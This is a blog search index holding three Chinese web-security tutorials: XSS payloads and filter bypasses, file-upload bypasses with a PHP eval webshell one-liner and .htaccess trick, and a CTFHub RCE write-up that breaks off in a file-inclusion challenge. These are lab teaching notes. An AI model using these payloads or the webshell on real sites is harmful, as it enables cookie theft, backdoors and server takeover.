<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>XSS</title>
      <link href="/post/fe1aa8c3.html"/>
      <url>/post/fe1aa8c3.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2 id="XSS攻击概述"><a href="#XSS攻击概述" class="headerlink" title="XSS攻击概述"></a>XSS攻击概述</h2><ul><li>跨站脚本攻击XSS(Cross Site Scripting)<br>恶意攻击者往 Web 页面里插入恶意 Script 代码，当用户浏览该页面时，嵌入 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的。<br>XSS 攻击针对的是用户层面的攻击！</li></ul><h2 id="XSS攻击原理"><a href="#XSS攻击原理" class="headerlink" title="XSS攻击原理"></a>XSS攻击原理</h2><ul><li><p>HTML 是一种超文本标记语言，通过将一些字符特殊地对待来区别文本和标记，例如，小于符号（&lt;）被看作是 HTML 标签的开始，之间的字符是页面的标题等等。当动态页面中插入的内容含有这些特殊字符（如&lt;）时，用户浏览器会将其误认为是插入了 HTML 标签，当这些 HTML 标签引入了一段 JavaScript 脚本时，这些脚本程序就将会在用户浏览器中执行。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生 XSS 漏洞。</p></li><li><p>所有标签的 &gt; 都可以用 // 代替， 例如 <code>&lt;script&gt;alert(1)&lt;/script//</code></p></li></ul><h2 id="XSS攻击载荷"><a href="#XSS攻击载荷" class="headerlink" title="XSS攻击载荷"></a>XSS攻击载荷</h2><ol><li>script标签</li></ol><blockquote><p> <code>&lt;script&gt;</code>标签是最直接XSS，脚本标记可以引用外部的JavaScript代码，也可以将代码插入脚本标记中</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;hack&quot;</span>)&lt;/script&gt;   #弹出hack</span><br><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="regexp">/hack/</span>)&lt;/script&gt;   #弹出hack</span><br><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;        #弹出<span class="number">1</span>，对于数字可以不用引号</span><br><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)&lt;/script&gt;      #弹出cookie</span><br><span class="line">&lt;script src=<span class="attr">http</span>:<span class="comment">//xxx.com/xss.js&gt;&lt;/script&gt;  #引用外部的xss</span></span><br></pre></td></tr></table></figure><ol start="2"><li>svg标签</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;alert(1)&quot;</span>//</span></span></span><br></pre></td></tr></table></figure><ol start="3"><li>img标签</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="title function_">alert</span>(<span class="string">&quot;hack&quot;</span>)&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span>  <span class="attr">src</span>=<span class="string">1</span>  <span class="attr">οnerrοr</span>=<span class="string">alert(document.cookie)</span>&gt;</span>  #弹出cookie</span></span><br></pre></td></tr></table></figure><ol start="4"><li>body标签</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body οnlοad=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span> <span class="attr">οnpageshοw</span>=<span class="string">alert(1)</span>&gt;</span></span></span><br></pre></td></tr></table></figure><ol start="5"><li>video标签</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video οnlοadstart=<span class="title function_">alert</span>(<span class="number">1</span>) src=<span class="string">&quot;/media/hack-the-planet.mp4&quot;</span> /&gt;</span><br></pre></td></tr></table></figure><ol start="6"><li>style标签</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;style οnlοad=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;&lt;/style&gt;</span><br></pre></td></tr></table></figure><h2 id="XSS可以插在哪里"><a href="#XSS可以插在哪里" class="headerlink" title="XSS可以插在哪里"></a>XSS可以插在哪里</h2><ol><li>用户输入作为script标签内容</li><li>用户输入作为HTML注释内容</li><li>用户输入作为HTML标签的属性名</li><li>用户输入作为HTML标签的属性值</li><li>用户输入作为HTML标签的名字</li><li>直接插入到CSS里</li><li>最重要的是，千万不要引入任何不可信的第三方JavaScript到页面里</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#用户输入作为<span class="variable constant_">HTML</span>注释内容，导致攻击者可以进行闭合绕过</span><br><span class="line">&lt;!-- 用户输入 --&gt;</span><br><span class="line">&lt;!-- --&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;hack&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>&lt;!-- --&gt;</span><br><span class="line"></span><br><span class="line">#用户输入作为标签属性名，导致攻击者可以进行闭合绕过</span><br><span class="line">&lt;div 用户输入=<span class="string">&quot;xx&quot;</span>&gt;  &lt;/div&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;hack&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">a</span>=<span class="string">&quot;xx&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">#用户输入作为标签属性值，导致攻击者可以进行闭合绕过</span><br><span class="line">&lt;div id=<span class="string">&quot;用户输入&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;hack&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">a</span>=<span class="string">&quot;x&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">#用户输入作为标签名，导致攻击者可以进行闭合绕过</span><br><span class="line">&lt;用户输入  id=<span class="string">&quot;xx&quot;</span> /&gt;</span><br><span class="line">&lt;&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;b id=&quot;xx&quot; /&gt;</span><br><span class="line"></span><br><span class="line">#用户输入作为CSS内容，导致攻击者可以进行闭合绕过</span><br><span class="line">&lt;style&gt;用户输入&lt;style&gt;</span><br><span class="line">&lt;style&gt; &lt;/style&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;style&gt; &lt;/style&gt;</span><br></pre></td></tr></table></figure><h2 id="XSS攻击的分类"><a href="#XSS攻击的分类" class="headerlink" title="XSS攻击的分类"></a>XSS攻击的分类</h2><ul><li>XSS分为：存储型、反射型、DOM型</li></ul><ol><li>存储型XSS：持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将存储到服务器中，用户访问该页面的时候出发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie</li><li>反射型XSS：非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在web页面。反射型XSS大多数是用来盗取用户的Cookie信息</li><li>DOM型XSS：不经过后端，DOM-XSS漏洞是基于文档对象模型（DOM）的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射性XSS</li></ol><h2 id="XSS的简单过滤和绕过"><a href="#XSS的简单过滤和绕过" class="headerlink" title="XSS的简单过滤和绕过"></a>XSS的简单过滤和绕过</h2><h3 id="区分大小写过滤标签"><a href="#区分大小写过滤标签" class="headerlink" title="区分大小写过滤标签"></a>区分大小写过滤标签</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//前端 1.html：</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>反射型XSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;action4.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//后端 action4.php：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">$name=$_POST[&quot;name&quot;]; </span></span><br><span class="line"><span class="meta">if($name!=null)&#123;</span></span><br><span class="line"><span class="meta">$name=preg_replace(&quot;/&lt;script&gt;/&quot;,&quot;&quot;,$name);      //过滤&lt;script&gt;</span></span><br><span class="line"><span class="meta">$name=preg_replace(&quot;/&lt;\/script&gt;/&quot;,&quot;&quot;,$name);   //过滤&lt;/script&gt;</span></span><br><span class="line"><span class="meta">echo $name; </span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p> 绕过技巧：可以使用大小写绕过  <code>&lt;scripT&gt;alert(&#39;hack&#39;)&lt;/scripT&gt;</code></p><h3 id="不区分大小写过滤标签"><a href="#不区分大小写过滤标签" class="headerlink" title="不区分大小写过滤标签"></a>不区分大小写过滤标签</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/&lt;script&gt;/i&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$name</span>);    <span class="comment">//不区分大小写过滤 &lt;script&gt;</span></span><br><span class="line"><span class="variable">$name</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/&lt;\/script&gt;/i&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$name</span>);  <span class="comment">//不区分大小写过滤 &lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>绕过技巧：可以使用嵌套的script标签绕过<code>&lt;scr&lt;script&gt;ipt&gt;alert(&#39;hack&#39;)&lt;/scr&lt;/script&gt;ipt&gt;</code></p><h3 id="不区分大小写，过滤之间的所有内容"><a href="#不区分大小写，过滤之间的所有内容" class="headerlink" title="不区分大小写，过滤之间的所有内容"></a>不区分大小写，过滤之间的所有内容</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] ); <span class="comment">//过滤了&lt;script  及其之间的所有内容</span></span><br></pre></td></tr></table></figure><p>虽然无法使用<script>标签注入XSS代码，但是可以通过img、body等标签的事件或者 iframe 等标签的 src 注入恶意的 js 代码。</p><p><code>payload： &lt;img src=1 οnerrοr=alert(&#39;hack&#39;)&gt;</code></p></script></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/post/592e5fba.html"/>
      <url>/post/592e5fba.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2 id="WebShell与WebShell管理工具"><a href="#WebShell与WebShell管理工具" class="headerlink" title="WebShell与WebShell管理工具"></a>WebShell与WebShell管理工具</h2><h3 id="什么叫做WebShell"><a href="#什么叫做WebShell" class="headerlink" title="什么叫做WebShell"></a>什么叫做WebShell</h3><ul><li>WebShell，简称网页后门。运行在<code>Web应用之上的远程控制程序</code> </li><li>webshell其实就是<code>一张网页</code>，由<code>PHP、JSP、ASP、ASP.NE</code>T等web语言开发，但并不具备常见网页的功能，例如登陆、注册、信息展示等功能，一般会具备文件管理、端口扫描、提权、获取系统信息等功能</li></ul><h3 id="常见的WebShell有哪些"><a href="#常见的WebShell有哪些" class="headerlink" title="常见的WebShell有哪些"></a>常见的WebShell有哪些</h3><ul><li>大马、小马、各种马等</li><li>拥有完整功能的webshell，我们一般称为<code>大马</code></li><li>功能简易的webshell称为<code>小马</code></li><li>除此之外还有<code>一句话木马、不死马、脱库马</code>等等，是对webshell功能或者特性的简称</li></ul><h3 id="WebShell有什么作用呢"><a href="#WebShell有什么作用呢" class="headerlink" title="WebShell有什么作用呢"></a>WebShell有什么作用呢</h3><p><strong>大马有什么作用呢</strong></p><ul><li>上传大马后，可以通过大马来获取目标主机的控制权限、对内网进行扫描、获取内部系统的信息、盗取数据库等一系列操作</li></ul><p><strong>一句话木马解读</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[x]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>$_POST[x]</code>: 获取<code>POST</code>请求参数中x的值。例如<code>POST</code>请求中传递<code>x=phpinfo();</code>，那么<code>$_POST[x]</code>就等同于<code>phpinfo();</code></li><li><code>eval()</code>将字符串当作PHP代码去执行。例如<code>eval(&#39;phpinfo();&#39;)</code>，其中<code>phpinfo();</code>会被当做PHP代码去执行。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[x]); <span class="meta">?&gt;</span>   实际上的传递过程是这样的</span><br><span class="line">↓</span><br><span class="line">↓</span><br><span class="line">↓</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="meta">?&gt;</span> 实际的语句是这样的 </span><br></pre></td></tr></table></figure><ul><li>我们通过该<code>webshell</code>，传递<code>任意PHP代码</code>，让其去执行，从而达到<code>任意代码执行</code>。</li><li>错误控制运算符，当将 <code>@</code>放置在一个PHP表达式之前，该表达式可能产生的任何错误信息都被 <code>忽略</code>掉。</li></ul><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><strong>什么是文件上传漏洞</strong></p><ul><li>文件上传漏洞是指文件上传功能<code>没有对上传的文件做合理严谨的过滤</code>，导致用户可以利用此功能，上传能<code>被服务端解析执行的文件</code>，并通过此文件获得<code>执行服务端命令的能力</code>。</li></ul><h3 id="客户端JavaScript检测"><a href="#客户端JavaScript检测" class="headerlink" title="客户端JavaScript检测"></a>客户端JavaScript检测</h3><ul><li>如果上传非法文件，返回结果很快，或者F12打开开发者模式，上传非法文件，发现没有网络请求，但是被拦截了，很有可能就是客户端进行了JS校验检测。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">        <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">        <span class="comment">//提取上传文件的类型</span></span><br><span class="line">        <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">        <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name) == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">            <span class="title function_">alert</span>(errMsg);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>绕过思路：1.直接本地禁用JS，不让其做检测 2.抓包，修改文件后缀名类型，绕过检测限制</strong></p><h3 id="服务器后端检测"><a href="#服务器后端检测" class="headerlink" title="服务器后端检测"></a>服务器后端检测</h3><h4 id="文件类型检测"><a href="#文件类型检测" class="headerlink" title="文件类型检测"></a>文件类型检测</h4><ul><li>此类检测防护主要是从content-type进行检测，检验请求中content-type是否符合可接受的上传类型(如”image/gif”,”image/png”,”image/jpeg”) </li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];          </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;     </span><br></pre></td></tr></table></figure><p><strong>绕过思路：抓包将content-type改为可接受图片形式，即可绕过</strong></p><h4 id="文件头类型检测"><a href="#文件头类型检测" class="headerlink" title="文件头类型检测"></a>文件头类型检测</h4><ul><li>上个文件类型是检测content-type,比较好伪造，这个则是使用getimagesize()函数来获取文件的MIME类型，通过文件头进行判断文件类型</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">       <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure><ul><li>文件头就是文件特定的标志，如二进制PE文件的4D5A，bmp文件的424D，zip文件的504B0304，各种常见文件的文件头类型大家可以查找了解一下，常见图片文件头如下：</li></ul><blockquote><p>gif: GIF89a</p><p>jpg,jpeg: FF D8 FF E0 00 10 4A 46 49 46</p><p>png: 89 50 4E 47 0D 0A</p></blockquote><p><strong>绕过思路：针对这种，上传木马恶意文件时，先使用编辑工具在数据最前面添加图片的文件头进行伪造，即可绕过</strong></p><h4 id="文件扩展名检测"><a href="#文件扩展名检测" class="headerlink" title="文件扩展名检测"></a>文件扩展名检测</h4><ul><li>这种类型有基于黑名单检测和白名单检测。通常基于黑名单是很不安全的，黑名单机制：只拦截名单中出现的扩展后缀名，其余默认放行。这就取决于名单中的扩展后缀名覆盖能力范围了，很难把所有的考虑全面，就很容易造成漏洞。</li></ul><p><strong>黑名单绕过思路：可以从服务器的解析特性进行分析，如特殊可解析后缀php3,php7,phtml,jspx等 如特殊的解析方式陌生后缀名，带换行后缀名，双后缀名等解析差异造成的漏洞。 还可以从混淆方面出发，后缀名大小写，点绕过，空格绕过，以及上传.htaccess配置控制文件权限和::$DATA数据流的使用</strong></p><ul><li>基于白名单相对于黑名单就安全很多了，要求只能是特定扩展名的文件才能够上传。</li></ul><p><strong>白名单绕过思路：MIME绕过，修改文件类型为白名单可接受的类型，以及%00，0x00截断绕过，这种场景针对save_path可控。</strong></p><ul><li>00截断原理其实很巧妙，利用场景是文件保存路径可控，这样一来我们上传的文件符合白名单就行，真正动手的地方在文件保存路径出，可以放上自己的webshell文件，然后在webshell文件后面添加%00,或0x00，再加一些字符，这样一来，系统在解析碰到00就会截断，后面字符就不起作用，只剩下前面的webshell文件名，就可以在url中进行访问了。%00和0x00的使用区别在于提交get请求时，是%00,会进行url自动解码动作，然后进入验证函数。0x00则是post请求直接进入验证函数。</li></ul><h4 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h4><ul><li>htaccess文件是apache服务器的一个配置文件，它负责相关目录下的网页配置</li></ul><ul><li>通过htaccess文件，可以帮助我们实现：网页301重定向、自定义404错误页面，改变文件扩展名、允许/阻止特定的用户或者目录的访问，禁止目录列表，配置默认文档等功能</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.jpg&quot;&gt;</span><br><span class="line">  SetHandler application/x-httpd-php </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><ul><li>其中，SetHandler application/x-httpd-php意思是设置当前目录所有文件都使用php解析，那么无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行，不符合规则则报错</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFHUB_RCE</title>
      <link href="/post/7e6bea45.html"/>
      <url>/post/7e6bea45.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2 id="一、eval执行"><a href="#一、eval执行" class="headerlink" title="一、eval执行"></a>一、eval执行</h2><p>打开环境发现一段php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现参数为cmd</p><p><code>payload：?cmd=phpinfo();</code><br>有回显，说明可以利用系统命令函数</p><p><code>payload：?cmd=system(&quot;ls /&quot;);</code><br>有回显，并且看到有关于flag的文件，读取它</p><p><code>payload：?cmd=system(&quot;ls / | cat /flag_9712&quot;);</code><br>得到flag</p><h2 id="二、文件包含"><a href="#二、文件包含" class="headerlink" title="二、文件包含"></a>二、文件包含</h2><p>打开环境发现一段php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">strpos</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;hr&gt;</span><br><span class="line">i have a &lt;a href=<span class="string">&quot;shell.txt&quot;</span>&gt;shell&lt;/a&gt;, how to <span class="keyword">use</span> <span class="title">it</span> ?</span><br></pre></td></tr></table></figure><p>介绍一下陌生函数：</p><blockquote><p>strpos(x,y)    查看y是否在x里</p><p>include    